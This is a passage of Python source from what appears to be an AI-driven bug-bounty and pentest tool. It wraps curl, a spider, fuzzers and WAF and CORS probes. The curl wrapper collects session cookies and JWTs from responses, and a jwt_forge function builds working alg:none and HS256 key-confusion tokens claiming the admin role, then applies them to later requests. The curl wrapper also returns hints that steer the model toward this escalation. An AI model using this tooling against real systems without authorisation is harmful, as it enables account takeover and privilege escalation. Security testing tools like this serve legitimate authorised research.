        from hellhound.mcp.hackerone_mcp.server import search_disclosed_reports
        results = search_disclosed_reports(keyword=keyword, program=program, limit=limit)
        return {"status": "success", "results": results, "count": len(results)}
    except Exception as e:
        return {"error": f"HackerOne search failed: {e}"}


def _execute_hackerone_policy(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Get the public policy and scopes for a HackerOne program."""
    program = args.get("program", "") or target.name.split(".")[0]
    
    try:
        from hellhound.mcp.hackerone_mcp.server import get_program_policy
        result = get_program_policy(program)
        if "error" in result:
            return result
        return {"status": "success", "policy": result}
    except Exception as e:
        return {"error": f"Failed to retrieve HackerOne policy: {e}"}


def _execute_hackerone_stats(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Get public statistics (bounties, response times, resolved reports) for a HackerOne program."""
    program = args.get("program", "") or target.name.split(".")[0]
    
    try:
        from hellhound.mcp.hackerone_mcp.server import get_program_stats
        result = get_program_stats(program)
        if "error" in result:
            return result
        return {"status": "success", "stats": result}
    except Exception as e:
        return {"error": f"Failed to retrieve HackerOne stats: {e}"}


def _clean_synthesizer_output(text: str) -> str:
    """
    Defensive net: if the synthesizer model ignored its plain-prose
    instruction and emitted a raw orchestrator-style JSON tool-call object
    instead (seen with small local models echoing prior tool-call turns),
    convert it into a readable sentence instead of dumping raw JSON to the
    user's terminal.
    """
    if not text:
        return text
    stripped = text.strip()
    candidate = stripped
    m = re.search(r'```(?:json)?\s*(\{[\s\S]*?\})\s*```', stripped)
    if m:
        candidate = m.group(1)
    elif not (stripped.startswith("{") and stripped.endswith("}")):
        return text

    try:
        parsed = json.loads(candidate)
    except Exception:
        return text

    if not isinstance(parsed, dict) or not ({"tool", "next_steps"} & set(parsed.keys())):
        return text

    parts = []
    if parsed.get("analysis"):
        parts.append(str(parsed["analysis"]))
    if parsed.get("next_steps"):
        parts.append(f"Next: {parsed['next_steps']}")
    if parsed.get("tool"):
        args_str = json.dumps(parsed.get("args", {}))
        parts.append(f"(Suggested next tool: {parsed['tool']} {args_str})")

    return "\n\n".join(parts) if parts else text


def _execute_dig(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    domain = args.get("domain") or target.name
    record_type = args.get("type", "A").upper()
    domain = domain.strip().lower()
    if domain.startswith(("http://", "https://")):
        domain = urlparse(domain).netloc.split(":")[0]

    records = []
    try:
        cmd = ["dig", "+short", record_type, domain]
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        if proc.returncode == 0:
            for line in proc.stdout.splitlines():
                if line.strip():
                    records.append(line.strip())
    except Exception as e:
        records.append(f"Error running dig: {e}")

    return {
        "domain": domain,
        "type": record_type,
        "records": records
    }


def _execute_curl(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    url = args.get("url") or target.name
    method = args.get("method", "GET").upper()
    custom_headers = dict(args.get("headers") or {})
    
    body = args.get("json") or args.get("body") or args.get("data")
    
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"

    cookies_arg = args.get("cookies") or args.get("cookie")
    req_cookies = {}
    if isinstance(cookies_arg, dict):
        req_cookies = dict(cookies_arg)
    elif isinstance(cookies_arg, str) and cookies_arg.strip():
        if not any(k.lower() == "cookie" for k in custom_headers.keys()):
            custom_headers["Cookie"] = cookies_arg.strip()

    # If no Cookie header or cookies provided, auto-attach session cookies from target state if available
    if not req_cookies and not any(k.lower() == "cookie" for k in custom_headers.keys()) and hasattr(target, "state") and isinstance(target.state, dict):
        saved_cookie = target.state.get("session_cookie")
        saved_cookies_dict = target.state.get("cookies")
        if saved_cookie:
            custom_headers["Cookie"] = str(saved_cookie)
        elif saved_cookies_dict and isinstance(saved_cookies_dict, dict):
            req_cookies = dict(saved_cookies_dict)

    headers = merge_global_context({"global_headers": custom_headers})
    
    json_payload = None
    data_payload = None
    
    if args.get("json") is not None:
        json_payload = args.get("json")
    elif isinstance(body, dict):
        json_payload = body
    elif isinstance(body, str):
        body_str = body.strip()
        if (body_str.startswith("{") and body_str.endswith("}")) or (body_str.startswith("[") and body_str.endswith("]")):
            try:
                import json
                json_payload = json.loads(body_str)
            except Exception:
                data_payload = body
        else:
            data_payload = body

    has_content_type = any(k.lower() == "content-type" for k in headers.keys())
    if json_payload is not None and not has_content_type:
        headers["Content-Type"] = "application/json"
    elif data_payload is not None and not has_content_type:
        if "=" in str(data_payload) and "&" in str(data_payload) or ("=" in str(data_payload) and not "{" in str(data_payload)):
            headers["Content-Type"] = "application/x-www-form-urlencoded"

    try:
        if json_payload is not None:
            r = requests.request(
                method=method,
                url=url,
                headers=headers,
                cookies=req_cookies or None,
                json=json_payload,
                timeout=10,
                verify=False,
                allow_redirects=False
            )
        else:
            r = requests.request(
                method=method,
                url=url,
                headers=headers,
                cookies=req_cookies or None,
                data=data_payload,
                timeout=10,
                verify=False,
                allow_redirects=False
            )

        # Store observed session cookies in target.state so subsequent tools (curl, gowitness, spider) can reuse them
        raw_set_cookie = r.headers.get("set-cookie") or r.headers.get("Set-Cookie")
        if (r.cookies or raw_set_cookie) and hasattr(target, "state") and isinstance(target.state, dict):
            if "cookies" not in target.state or not isinstance(target.state["cookies"], dict):
                target.state["cookies"] = {}
            if r.cookies:
                target.state["cookies"].update(r.cookies.get_dict())
                for ck, cv in r.cookies.get_dict().items():
                    if any(x in ck.lower() for x in ("sess", "token", "auth", "sid", "jwt", "id", "cookie", "key")):
                        target.state["session_cookie"] = f"{ck}={cv}"
                    if isinstance(cv, str) and cv.startswith("eyJ") and cv.count(".") >= 1:
                        target.state["auth_token"] = cv
                        if "headers" not in target.state or not isinstance(target.state["headers"], dict):
                            target.state["headers"] = {}
                        target.state["headers"]["Authorization"] = f"Bearer {cv}"
            if raw_set_cookie:
                for part in raw_set_cookie.split(";"):
                    if "=" in part:
                        k, v = part.strip().split("=", 1)
                        k_clean = k.strip()
                        v_clean = v.strip()
                        if k_clean.lower() not in ("path", "domain", "expires", "max-age", "samesite", "httponly", "secure"):
                            target.state["cookies"][k_clean] = v_clean
                            if any(x in k_clean.lower() for x in ("sess", "token", "auth", "sid", "jwt", "id", "cookie", "key")):
                                target.state["session_cookie"] = f"{k_clean}={v_clean}"
                            if v_clean.startswith("eyJ") and v_clean.count(".") >= 1:
                                target.state["auth_token"] = v_clean
                                if "headers" not in target.state or not isinstance(target.state["headers"], dict):
                                    target.state["headers"] = {}
                                target.state["headers"]["Authorization"] = f"Bearer {v_clean}"

        # Extract JWT / auth tokens from JSON response bodies (e.g. {"token": "...", "access_token": "..."})
        if hasattr(target, "state") and isinstance(target.state, dict):
            try:
                resp_json = r.json()
                if isinstance(resp_json, dict):
                    for tk in ("token", "access_token", "jwt", "auth_token", "accessToken", "authToken", "id_token", "session_token"):
                        if tk in resp_json and isinstance(resp_json[tk], str) and resp_json[tk].strip():
                            token_val = resp_json[tk].strip()
                            target.state["auth_token"] = token_val
                            if "headers" not in target.state or not isinstance(target.state["headers"], dict):
                                target.state["headers"] = {}
                            target.state["headers"]["Authorization"] = f"Bearer {token_val}"
                            break
            except Exception:
                pass
            save_target(target)

        # Inspect and decode JWT if present
        jwt_candidate = None
        if hasattr(target, "state") and isinstance(target.state, dict) and target.state.get("auth_token"):
            auth_val = target.state.get("auth_token")
            if isinstance(auth_val, str) and auth_val.startswith("eyJ") and auth_val.count(".") >= 1:
                jwt_candidate = auth_val
        if not jwt_candidate and r.cookies:
            for cv in r.cookies.get_dict().values():
                if isinstance(cv, str) and cv.startswith("eyJ") and cv.count(".") >= 1:
                    jwt_candidate = cv
                    break
        if not jwt_candidate and r.text:
            jwt_m = re.search(r'eyJ[a-zA-Z0-9_-]{10,}\.eyJ[a-zA-Z0-9_-]{10,}\.[a-zA-Z0-9_-]*', r.text)
            if jwt_m:
                jwt_candidate = jwt_m.group(0)

        jwt_info = None
        if jwt_candidate and isinstance(jwt_candidate, str) and jwt_candidate.startswith("eyJ") and jwt_candidate.count(".") >= 1:
            try:
                parts = jwt_candidate.split(".")
                def _b64dec(s: str) -> Dict[str, Any]:
                    s = s.replace("-", "+").replace("_", "/")
                    s += "=" * ((4 - len(s) % 4) % 4)
                    return json.loads(base64.b64decode(s).decode("utf-8", errors="ignore"))
                hdr = _b64dec(parts[0]) if len(parts) > 0 else {}
                pay = _b64dec(parts[1]) if len(parts) > 1 else {}
                if hdr and pay:
                    role_val = pay.get("role") or pay.get("roles") or pay.get("isAdmin") or pay.get("admin") or "user"
                    jwt_info = {
                        "token": jwt_candidate,
                        "header": hdr,
                        "payload": pay,
                        "role": role_val,
                        "alg": hdr.get("alg")
                    }
                    if str(role_val).lower() not in ("admin", "administrator", "root", "true"):
                        jwt_info["privilege_escalation_hint"] = "Non-admin JWT detected. Use jwt_forge tool or forge alg:none with role: admin to escalate."
            except Exception:
                pass

        # Extract detected routes, script bundles, and authorization logic from response
        detected_scripts = set()
        detected_routes = set()
        detected_api_endpoints = set()
        auth_logic_snippets = []

        if r.text:
            # 1. Detect JavaScript bundle assets (<script src="...">, /assets/*.js, etc.)
            for m in re.findall(r'''(?:src|href)\s*=\s*[\"']([^\"' >]+\.js(?:\?[^\"' >]*)?)[\"']''', r.text, re.I):
                clean_script = m.split("?")[0]
                detected_scripts.add(clean_script)
            for m in re.findall(r'''['\"](/[a-zA-Z0-9_\-\.\/]+\.js)['\"]''', r.text):
                detected_scripts.add(m)

            # 2. Detect general paths and links
            for m in re.findall(r'''(?:href|action|path|url|to)\s*=\s*[\"'](/[^\"' >]+)[\"']''', r.text, re.I):
                if not any(m.endswith(ext) for ext in (".css", ".png", ".jpg", ".jpeg", ".svg", ".woff", ".ico")):
                    detected_routes.add(m)
            for m in re.findall(r'''['\"](/[a-zA-Z0-9_\-\.\/]+)['\"]''', r.text):
                if len(m) > 1 and not m.startswith("//") and not any(m.endswith(ext) for ext in (".css", ".png", ".jpg", ".jpeg", ".svg", ".woff", ".ico")):
                    if m.endswith(".js"):
                        detected_scripts.add(m)
                    else:
                        detected_routes.add(m)
            for m in re.findall(r'''(?:window\.__BASE__\s*\|\|\s*['\"]['\"])\s*\+\s*['\"](/[^\"']+)['\"]''', r.text):
                detected_routes.add(m)

            # 3. Detect API endpoints (/api/...) and authorization logic if response is JS or large text
            is_js_response = url.endswith(".js") or "javascript" in r.headers.get("Content-Type", "").lower()
            for api_match in re.findall(r'''['\"](/[a-zA-Z0-9_\-\.\/]*api[a-zA-Z0-9_\-\.\/]*)['\"]''', r.text):
                if len(api_match) > 4 and not any(api_match.endswith(ext) for ext in (".css", ".png", ".jpg", ".jpeg", ".svg", ".woff", ".ico")):
                    detected_api_endpoints.add(api_match)

            if is_js_response or len(r.text) > 1000:
                for line in re.findall(r'''[^;{}]*(?:role|owner|admin|entitlement|permission|is_admin|metadata|console|billing)[^;{}]{0,100}''', r.text, re.I):
                    line_clean = line.strip().replace("\n", " ")
                    if 10 < len(line_clean) < 120 and any(kw in line_clean.lower() for kw in ("role", "owner", "admin", "entitlement", "permission", "is_admin")):
                        if line_clean not in auth_logic_snippets:
                            auth_logic_snippets.append(line_clean)

        clean_routes = []
        for cr in sorted(list(detected_routes)):
            if not any(cr.endswith(ext) for ext in (".css", ".png", ".jpg", ".jpeg", ".svg", ".ico", ".woff", ".js")):
                clean_routes.append(cr)
        clean_routes = clean_routes[:35]

        # Register discovered endpoints into target state
        if hasattr(target, "state") and isinstance(target.state, dict):
            if "endpoints" not in target.state or not isinstance(target.state["endpoints"], list):
                target.state["endpoints"] = []
            for ep in list(clean_routes) + list(detected_api_endpoints):
                full_url = ep if ep.startswith("http") else f"https://{target.name}{ep}"
                if full_url not in target.state["endpoints"]:
                    target.state["endpoints"].append(full_url)
            save_target(target)

        resp_dict: Dict[str, Any] = {
            "url": url,
            "status_code": r.status_code,
            "headers": dict(r.headers),
            "cookies": r.cookies.get_dict(),
            "body_preview": r.text[:20000]
        }
        if jwt_info:
            resp_dict["jwt_info"] = jwt_info
        if detected_scripts:
            clean_scripts = sorted(list(detected_scripts))[:10]
            resp_dict["discovered_script_assets"] = clean_scripts
            resp_dict["methodology_hint"] = (
                f"CLIENT JAVASCRIPT DETECTED ({len(clean_scripts)} file(s)). "
                f"Do NOT guess API endpoints blind. Fetch referenced JavaScript bundle(s) with curl "
                f"to extract the exact client route table, API endpoints, and role/authorization logic."
            )
        if detected_api_endpoints:
            resp_dict["discovered_api_endpoints"] = sorted(list(detected_api_endpoints))[:25]
        if auth_logic_snippets:
            resp_dict["authorization_logic_snippets"] = auth_logic_snippets[:15]
        if clean_routes:
            resp_dict["detected_routes"] = clean_routes
        return resp_dict
    except Exception as e:
        return {
            "url": url,
            "error": str(e)
        }


def _execute_jwt_forge(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Decode and forge JWTs for privilege escalation and algorithm confusion."""
    token = args.get("token")
    if not token and hasattr(target, "state") and isinstance(target.state, dict):
        token = target.state.get("auth_token")
        if not token and "cookies" in target.state and isinstance(target.state["cookies"], dict):
            for ck, cv in target.state["cookies"].items():
                if isinstance(cv, str) and cv.startswith("eyJ") and cv.count(".") >= 1:
                    token = cv
                    break

    if not token:
        return {
            "status": "error",
            "error": "No JWT token provided or found in target session state.",
            "hint": "Inspect target session state. If cookies are opaque (e.g. sess_..., connect.sid, PHPSESSID), the application uses server-side sessions, NOT JWTs. Look for mass assignment, nested property injection, or business logic flaws instead."
        }

    # Strict check: Reject obvious placeholder strings or opaque cookies
    if "..." in token or token.startswith("sess_") or token.count(".") < 1:
        return {
            "status": "error",
            "error": f"The provided token '{token[:30]}...' is not a valid JSON Web Token (JWT). It appears to be an opaque session identifier or placeholder. JWT attacks (alg:none, algorithm confusion) only apply to dot-separated base64url JWTs.",
            "hint": "Do NOT attempt JWT forgery on opaque session cookies. Check application JavaScript and API endpoints for mass assignment (e.g. updating profile/account attributes via PATCH/PUT/POST) or IDOR."
        }

    def b64url_decode_json(s: str) -> Dict[str, Any]:
        s = s.replace("-", "+").replace("_", "/")
        s += "=" * ((4 - len(s) % 4) % 4)
        try:
            return json.loads(base64.b64decode(s).decode("utf-8", errors="ignore"))
        except Exception:
            return {}

    def b64url_encode(obj: Any) -> str:
        if isinstance(obj, (dict, list)):
            raw = json.dumps(obj, separators=(",", ":")).encode("utf-8")
        elif isinstance(obj, str):
            raw = obj.encode("utf-8")
        else:
            raw = bytes(obj)
        return base64.urlsafe_b64encode(raw).decode("utf-8").rstrip("=")

    parts = token.strip().split(".")
    if len(parts) < 2:
        return {
            "status": "error",
            "error": "Token is not a valid JWT (must have at least 2 dot-separated segments).",
            "hint": "Check if target uses opaque session cookies rather than JWTs."
        }

    header = b64url_decode_json(parts[0])
    payload = b64url_decode_json(parts[1])

    if not header or not payload:
        return {
            "status": "error",
            "error": "Failed to decode JWT header or payload as valid JSON. The token is not a genuine JWT.",
            "hint": "Verify the cookie/header value. If it is an opaque session ID, test access control via parameter tampering / mass assignment."
        }

    target_claims = args.get("claims") or {"role": "admin"}
    forged_payload = dict(payload)
    forged_payload.update(target_claims)

    algo = (args.get("algorithm") or "all").lower()
    pub_or_secret = args.get("public_key_or_secret") or ""

    forged_tokens = []

    # 1. alg: none variations
    if algo in ("none", "all"):
        for alg_val in ("none", "None", "NONE"):
            hdr_none = dict(header)
            hdr_none["alg"] = alg_val
            hdr_b64 = b64url_encode(hdr_none)
            pay_b64 = b64url_encode(forged_payload)
            tok_none = f"{hdr_b64}.{pay_b64}."
            forged_tokens.append({
                "type": f"alg:{alg_val}",
                "description": f"Unsigned JWT with alg={alg_val}",
                "token": tok_none
            })

    # 2. RS256 -> HS256 algorithm confusion (if public key/secret provided)
    if algo in ("hs256", "all") and pub_or_secret:
        hdr_hs = dict(header)
        hdr_hs["alg"] = "HS256"
        hdr_b64 = b64url_encode(hdr_hs)
        pay_b64 = b64url_encode(forged_payload)
        signing_input = f"{hdr_b64}.{pay_b64}".encode("utf-8")
        key_bytes = pub_or_secret.encode("utf-8")
        sig = hmac.new(key_bytes, signing_input, hashlib.sha256).digest()
        sig_b64 = b64url_encode(sig)
        tok_hs = f"{hdr_b64}.{pay_b64}.{sig_b64}"
        forged_tokens.append({
            "type": "alg:HS256 (public key confusion)",
            "description": "HMAC-SHA256 signed using public key/secret",
            "token": tok_hs
        })

    primary_token = forged_tokens[0]["token"] if forged_tokens else token

    # Auto-update target state only if original token was a JWT
    if hasattr(target, "state") and isinstance(target.state, dict):
        target.state["auth_token"] = primary_token
        target.state["forged_token"] = primary_token
        if "headers" not in target.state or not isinstance(target.state["headers"], dict):
            target.state["headers"] = {}
        target.state["headers"]["Authorization"] = f"Bearer {primary_token}"
        if "cookies" in target.state and isinstance(target.state["cookies"], dict):
            for ck, val in list(target.state["cookies"].items()):
                # Only replace if the original cookie value was actually the JWT
                if val == token or (isinstance(val, str) and val.startswith("eyJ")):
                    target.state["cookies"][ck] = primary_token
                    target.state["session_cookie"] = f"{ck}={primary_token}"
        save_target(target)

    return {
        "status": "success",
        "original_header": header,
        "original_payload": payload,
        "forged_payload": forged_payload,
        "primary_token": primary_token,
        "forged_tokens": forged_tokens,
        "instructions": (
            "Primary forged token has been applied to target.state. "
            "Use curl, gowitness, or spider against protected endpoints (e.g. /console, /dashboard) "
            "with Cookie or Authorization header to verify administrative access."
        )
    }


def _execute_spider(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    from hellhound.core.engine import HellhoundEngine
    url = args.get("url") or target.name
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"
    depth = args.get("depth", 2)

    engine = HellhoundEngine()
    opts = {"depth": depth, "max_pages": 50, "target": url}

    # Propagate session cookies / auth headers from args or target.state for authenticated crawling
    cookie_candidate = args.get("cookies") or args.get("cookie")
    if not cookie_candidate and hasattr(target, "state") and isinstance(target.state, dict):
        cookie_candidate = target.state.get("session_cookie") or target.state.get("cookies")
    if cookie_candidate:
        opts["cookie"] = cookie_candidate

    headers_candidate = args.get("headers")
    if not headers_candidate and hasattr(target, "state") and isinstance(target.state, dict):
        headers_candidate = target.state.get("headers")
        if not headers_candidate and target.state.get("auth_token"):
            headers_candidate = {"Authorization": f"Bearer {target.state.get('auth_token')}"}
    if headers_candidate:
        opts["headers"] = headers_candidate

    try:
        res = engine.run_single("spider", url, options=opts, emit=emit)
        intel = res.get("intel", {}) if isinstance(res, dict) else {}
        if intel and hasattr(target, "state"):
            target.state["spider_intel"] = intel
        endpoints = [ep.get("url") for ep in intel.get("endpoints", []) if isinstance(ep, dict) and ep.get("url")]
        if endpoints and hasattr(target, "state"):
            if "endpoints" not in target.state:
                target.state["endpoints"] = []
            for ep in endpoints:
                if ep not in target.state["endpoints"]:
                    target.state["endpoints"].append(ep)

        # Extract JS-discovered routes and parameters properly from intel
        raw_eps = intel.get("endpoints", []) if isinstance(intel, dict) else []
        js_routes = []
        parameters = []
        for ep in raw_eps:
            if isinstance(ep, dict):
                srcs = ep.get("source", [])
                if any("JS" in str(s) or "SPA" in str(s) for s in srcs):
                    u = ep.get("url")
                    if u and u not in js_routes:
                        js_routes.append(u)
                for p in ep.get("params", []):
                    if p and str(p) not in parameters:
                        parameters.append(str(p))

        # Also extract parameters from forms and js_orphan_params
        for form in intel.get("forms", []):
            if isinstance(form, dict):
                for f_field in form.get("fields", []):
                    if isinstance(f_field, dict):
                        f_name = f_field.get("name")
                        if f_name and str(f_name) not in parameters:
                            parameters.append(str(f_name))

        for file_params in (intel.get("js_orphan_params") or {}).values():
            if isinstance(file_params, list):
                for p in file_params:
                    if p and str(p) not in parameters:
                        parameters.append(str(p))

        try:
            update_from_spider(
                target,
                endpoints=endpoints,
                js_routes=js_routes,
                parameters=parameters,
            )
            save_target(target)
        except Exception:
            pass  # structured memory is best-effort — never let it break the actual crawl result

        return {
            "url": url,
            "endpoints_found": len(endpoints),
            "js_routes_found": len(js_routes),
            "parameters_found": len(parameters),
            "sample_endpoints": endpoints[:30],
            "forms_found": len(intel.get("forms", [])),
            "parameters": parameters[:20],
            "crashed": bool(isinstance(res, dict) and res.get("crashed")),
            "tool_error": res.get("error") if isinstance(res, dict) else None
        }
    except Exception as e:
        return {"url": url, "error": f"Spider error: {e}"}


def _execute_wafbuster(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    from hellhound.core.engine import HellhoundEngine
    url = args.get("url") or target.name
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"

    engine = HellhoundEngine()
    try:
        res = engine.run_single("wafbuster", url, emit=emit)
        return {
            "url": url,
            "result": res
        }
    except Exception as e:
        return {"url": url, "error": f"WAF check error: {e}"}


def _execute_surface_auditor(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    from hellhound.core.engine import HellhoundEngine
    url = args.get("url") or target.name
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"

    spider_intel = args.get("spider_intel") or target.state.get("spider_intel", {})
    opts = {"spider_intel": spider_intel}
    engine = HellhoundEngine()
    try:
        res = engine.run_single("surface_auditor", url, options=opts, emit=emit)
        return {
            "url": url,
            "result": res
        }
    except Exception as e:
        return {"url": url, "error": f"Surface auditor error: {e}"}


def _execute_cors_checker(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    from hellhound.core.engine import HellhoundEngine
    url = args.get("url") or target.name
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"

    spider_intel = args.get("spider_intel") or target.state.get("spider_intel", {})
    opts = {"spider_intel": spider_intel}
    engine = HellhoundEngine()
    try:
        res = engine.run_single("corsbuster", url, options=opts, emit=emit)
        return {
            "url": url,
            "result": res
        }
    except Exception as e:
        return {"url": url, "error": f"CORS check error: {e}"}


def _execute_graphql_probe(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    from hellhound.core.engine import HellhoundEngine
    url = args.get("url") or target.name
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"

    spider_intel = args.get("spider_intel") or target.state.get("spider_intel", {})
    opts = {"spider_intel": spider_intel}
    engine = HellhoundEngine()
    try:
        res = engine.run_single("graphql", url, options=opts, emit=emit)
        return {
            "url": url,
            "result": res
        }
    except Exception as e:
        return {"url": url, "error": f"GraphQL check error: {e}"}


def _execute_hydra(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Execute Hydra parameter and logic flaw analysis across discovered endpoints."""
    from hellhound.core.engine import HellhoundEngine
    url = args.get("url") or target.name
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"

    spider_intel = args.get("spider_intel") or target.state.get("spider_intel", {})
    if not spider_intel and "endpoints" in target.state:
        spider_intel = {"endpoints": [{"url": ep} if isinstance(ep, str) else ep for ep in target.state.get("endpoints", [])]}

    concurrency = args.get("concurrency", 10)
    enable_probing = args.get("enable_probing", False)
    opts = {
        "spider_intel": spider_intel,
        "concurrency": concurrency,
        "enable_probing": enable_probing,
    }
    engine = HellhoundEngine()
    try:
        res = engine.run_single("hydra", url, options=opts, emit=emit)
        intel = res.get("intel", {}) if isinstance(res, dict) else {}
        surfaces = intel.get("surfaces", [])
        logic_chains = intel.get("logic_chains", [])
        vulns = intel.get("vulnerabilities", [])

        for v in vulns:
            finding = {
                "type": f"Logic Flaw / Param Anomaly ({v.get('parameter', '')})",
                "target": v.get("url", url),
                "severity": "HIGH" if v.get("impact_score", 0) >= 8 else "MEDIUM",
                "details": v.get("impact_path") or v.get("attack_chains", []),
                "verified": False
            }
            if finding not in target.findings:
                target.findings.append(finding)

        return {
            "url": url,
            "raw": res.get("raw", "") if isinstance(res, dict) else str(res),
            "surfaces_analyzed": len(surfaces),
            "logic_chains_found": len(logic_chains),
            "high_impact_vulnerabilities": len(vulns),
            "signals": res.get("signals", []) if isinstance(res, dict) else [],
            "top_findings": surfaces[:10]
        }
    except Exception as e:
        return {"url": url, "error": f"Hydra analysis error: {e}"}


def _execute_cloudscout(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Scan application and recon text for cloud infrastructure assets."""
    from hellhound.core.engine import HellhoundEngine
    url = args.get("url") or target.name
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"

    spider_intel = args.get("spider_intel") or target.state.get("spider_intel", {})
    verify_public = args.get("verify_public", False)
    opts = {
        "spider_intel": spider_intel,
        "verify_public": verify_public
    }
    engine = HellhoundEngine()
    try:
        res = engine.run_single("cloudscout", url, options=opts, emit=emit)
        intel = res.get("intel", {}) if isinstance(res, dict) else {}
        assets = intel.get("assets", [])
        providers = intel.get("providers", [])
        return {
            "url": url,
            "assets_found": len(assets),
            "providers": providers,
            "assets": assets[:25],
            "risk_score": intel.get("risk_score", 0),
            "signals": intel.get("signals", [])
        }
    except Exception as e:
        return {"url": url, "error": f"CloudScout error: {e}"}


def _execute_transport_auditor(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Audit transport security: SSL certs, HTTPS/HSTS, and cookie security flags."""
    from hellhound.core.engine import HellhoundEngine
    url = args.get("url") or target.name
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"

    spider_intel = args.get("spider_intel") or target.state.get("spider_intel", {})
    opts = {
        "spider_intel": spider_intel,
        "check_ssl": args.get("check_ssl", True),
        "check_https": args.get("check_https", True),
        "check_cookies": args.get("check_cookies", True),
        "check_payment": args.get("check_payment", True),
    }
    engine = HellhoundEngine()
    try:
        res = engine.run_single("transport_auditor", url, options=opts, emit=emit)
        intel = res.get("intel", {}) if isinstance(res, dict) else {}
        findings = intel.get("findings", [])
        risk_score = res.get("risk_score", 0) if isinstance(res, dict) else 0

        for f in findings:
            if f.get("severity", 0) >= 15:
                finding = {
                    "type": f"Transport Security: {f.get('name', 'Issue')}",
                    "target": url,
                    "severity": "HIGH" if f.get("severity", 0) >= 30 else "MEDIUM",
                    "description": f.get("description", ""),
                    "verified": True
                }
                if finding not in target.findings:
                    target.findings.append(finding)

        return {
            "url": url,
            "findings_count": len(findings),
            "findings": findings,
            "risk_score": risk_score,
            "signals": res.get("signals", []) if isinstance(res, dict) else []
        }
    except Exception as e:
        return {"url": url, "error": f"Transport auditor error: {e}"}


def _execute_fuzz_hunter(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Run recursive path fuzzing with 404 similarity baseline heuristics."""
    from hellhound.core.engine import HellhoundEngine
    url = args.get("url") or target.name
    if not url.startswith(("http://", "https://")):
        url = f"https://{url}"

    spider_intel = args.get("spider_intel") or target.state.get("spider_intel", {})
    opts = {
        "spider_intel": spider_intel,
        "max_depth": args.get("max_depth", 2),
        "threads": args.get("threads", 10),
        "quick": args.get("quick", False),
    }
    engine = HellhoundEngine()
    try:
        res = engine.run_single("fuzz_hunter", url, options=opts, emit=emit)
        intel = res.get("intel", {}) if isinstance(res, dict) else {}
        endpoints = intel.get("endpoints", [])
        return {
            "url": url,
            "endpoints_found": len(endpoints),
            "endpoints": endpoints[:30],
            "signals": res.get("signals", []) if isinstance(res, dict) else []
        }
    except Exception as e:
        return {"url": url, "error": f"FUZZhunter error: {e}"}


def _execute_gowitness(args: Dict[str, Any], target: Target, emit: Any) -> Dict[str, Any]:
    """Capture web screenshots via gowitness and store them directly in the target workspace."""
    from datetime import datetime, timezone
    from hellhound.memory import update_from_gowitness

    url = args.get("url") or args.get("target") or ""
    urls = args.get("urls") or []

    if isinstance(urls, str):
        urls = [u.strip() for u in urls.split(",") if u.strip()]

    target_urls: List[str] = []
    if url:
        u = str(url).strip()
        if not u.startswith(("http://", "https://")):
            u = f"https://{u}"
        target_urls.append(u)
    for u in urls:
        u = str(u).strip()
        if u:
            if not u.startswith(("http://", "https://")):
                u = f"https://{u}"
            if u not in target_urls:
                target_urls.append(u)

    if not target_urls:
        t_name = target.name.strip()
        if t_name and t_name != "default":
            if not t_name.startswith(("http://", "https://")):
                target_urls.append(f"https://{t_name}")
            else:
                target_urls.append(t_name)

    if not target_urls:
        return {"error": "No URL or target specified for gowitness screenshot capture."}

    auto_install = bool(load_config().get("auto_install_missing_tools", False))
    check = ensure_tool("gowitness", emit=emit, auto_install=auto_install)
    if not check["available"]:
        if emit and hasattr(emit, "warn"):
            emit.warn(check["message"])
        return {
            "error": "gowitness not installed",
            "message": check["message"],
            "hint": "go install github.com/sensepost/gowitness@latest"
        }

    binary = get_binary_path("gowitness") or "gowitness"

    # Setup screenshot output directory
    target_safe_name = sanitize_target_name(target.name)
    custom_dir = args.get("output_dir") or args.get("screenshot_path")
    if custom_dir:
        screenshots_dir = Path(os.path.expanduser(custom_dir)).resolve()
    else:
        screenshots_dir = Path(os.path.expanduser(f"~/.hellhound/targets/{target_safe_name}/screenshots")).resolve()

    screenshots_dir.mkdir(parents=True, exist_ok=True)

    delay = int(args.get("delay", 2))
    fullpage = bool(args.get("fullpage", False))

    # Resolve headers and session cookies for authenticated screenshots
    custom_headers = dict(args.get("headers") or {})
    cookies_input = args.get("cookies") or args.get("cookie")
    cookies_dict: Dict[str, str] = {}

    if cookies_input:
        if isinstance(cookies_input, dict):
            cookies_dict.update({str(k): str(v) for k, v in cookies_input.items()})
        else:
            for pair in str(cookies_input).split(";"):
                if "=" in pair:
                    k, v = pair.strip().split("=", 1)
                    cookies_dict[k.strip()] = v.strip()

    # Auto-attach saved session cookies and headers from target.state
    if hasattr(target, "state") and isinstance(target.state, dict):
        saved_cookies = target.state.get("cookies")
        if saved_cookies and isinstance(saved_cookies, dict):
            for k, v in saved_cookies.items():
                cookies_dict.setdefault(str(k), str(v))
        saved_cookie = target.state.get("session_cookie")
        if saved_cookie and "=" in str(saved_cookie):
            for pair in str(saved_cookie).split(";"):
                if "=" in pair:
                    k, v = pair.strip().split("=", 1)
                    cookies_dict.setdefault(k.strip(), v.strip())
        saved_headers = target.state.get("headers")
        if saved_headers and isinstance(saved_headers, dict):
            for k, v in saved_headers.items():
